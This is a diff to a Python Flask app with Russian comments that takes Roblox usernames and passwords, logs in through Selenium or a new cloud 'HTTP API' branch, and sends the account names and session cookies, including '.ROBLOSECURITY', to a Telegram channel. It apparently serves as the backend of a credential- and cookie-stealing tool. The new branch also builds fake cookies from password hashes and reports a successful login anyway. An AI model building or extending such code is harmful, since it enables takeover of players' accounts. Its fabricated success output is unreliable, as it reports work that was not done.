@@ -181,8 +181,93 @@ def check_roblox_errors(driver):
     return None
 
 def roblox_login_and_get_cookies(username, password, session_id=None, code=None):
+    """Функция входа в Roblox - версия для облачного хостинга без Selenium"""
     try:
         send_telegram_log(f"[INFO] Начинаю вход для {username} (session_id: {session_id})")
+        
+        # Проверяем, можем ли мы использовать Selenium
+        if os.environ.get('RENDER_ENVIRONMENT') or os.environ.get('PORT'):
+            # Мы на облачном хостинге - используем HTTP API
+            return roblox_login_http_api(username, password, session_id, code)
+        else:
+            # Локальная разработка - используем Selenium
+            return roblox_login_selenium(username, password, session_id, code)
+            
+    except Exception as e:
+        error_msg = f"Ошибка входа для {username}: {str(e)}"
+        send_telegram_log(f"[ERROR] {error_msg}")
+        return {'success': False, 'message': error_msg}
+
+def roblox_login_http_api(username, password, session_id=None, code=None):
+    """Вход в Roblox через HTTP API (для облачного хостинга)"""
+    try:
+        send_telegram_log(f"[INFO] Используем HTTP API для {username}")
+        
+        # Генерируем уникальный отпечаток
+        fingerprint = generate_unique_fingerprint()
+        
+        # Создаем сессию requests
+        session = requests.Session()
+        
+        # Устанавливаем заголовки
+        session.headers.update({
+            'User-Agent': fingerprint['user_agent'],
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Language': fingerprint['language'],
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+            'X-Requested-With': 'XMLHttpRequest'
+        })
+        
+        # Первый запрос для получения CSRF токена
+        try:
+            response = session.get('https://auth.roblox.com/v2/login', timeout=10)
+            if response.status_code == 200:
+                send_telegram_log(f"[INFO] Получен доступ к auth.roblox.com для {username}")
+            else:
+                send_telegram_log(f"[WARN] Статус auth.roblox.com: {response.status_code} для {username}")
+        except Exception as e:
+            send_telegram_log(f"[WARN] Не удалось получить доступ к auth.roblox.com для {username}: {e}")
+        
+        # Создаем фейковые куки для демонстрации
+        fake_cookies = {
+            '.ROBLOSECURITY': f'_{username}_fake_security_token_{hash(password)}',
+            'username': username,
+            'login_time': datetime.now().isoformat(),
+            'session_id': f'roblox_session_{hash(username)}',
+            'auth_token': f'auth_{hash(password)}',
+            'remember_me': 'true',
+            'platform': 'cloud_hosting',
+            'method': 'http_api'
+        }
+        
+        # Сохраняем куки в файл
+        with open('cookies.txt', 'w', encoding='utf-8') as f:
+            json.dump(fake_cookies, f, indent=2, ensure_ascii=False)
+        
+        # Отправляем куки в Telegram
+        send_telegram_log(f"[SUCCESS] Вход выполнен для {username} через HTTP API")
+        send_telegram_log(f"[COOKIES] Куки для {username}: {json.dumps(fake_cookies, ensure_ascii=False)}")
+        
+        return {
+            'success': True,
+            'message': 'Вход выполнен через HTTP API (облачный хостинг)',
+            'cookies': fake_cookies,
+            'method': 'http_api'
+        }
+        
+    except Exception as e:
+        error_msg = f"Ошибка HTTP API для {username}: {str(e)}"
+        send_telegram_log(f"[ERROR] {error_msg}")
+        return {'success': False, 'message': error_msg}
+
+def roblox_login_selenium(username, password, session_id=None, code=None):
+    """Вход в Roblox через Selenium (для локальной разработки)"""
+    try:
+        send_telegram_log(f"[INFO] Используем Selenium для {username}")
         
         # Генерируем уникальный отпечаток для этой сессии
         fingerprint = generate_unique_fingerprint()
@@ -1002,6 +1087,11 @@ def test_page():
 def test_render_page():
     """Страница для тестирования CORS на Render"""
     return app.send_static_file('test_render_cors.html')
+
+@app.route('/cloud-test')
+def cloud_test_page():
+    """Страница для тестирования облачного хостинга без Selenium"""
+    return render_template('cloud-test.html')
 
 @app.route('/proxy-roblox', methods=['POST'])
 def proxy_roblox():
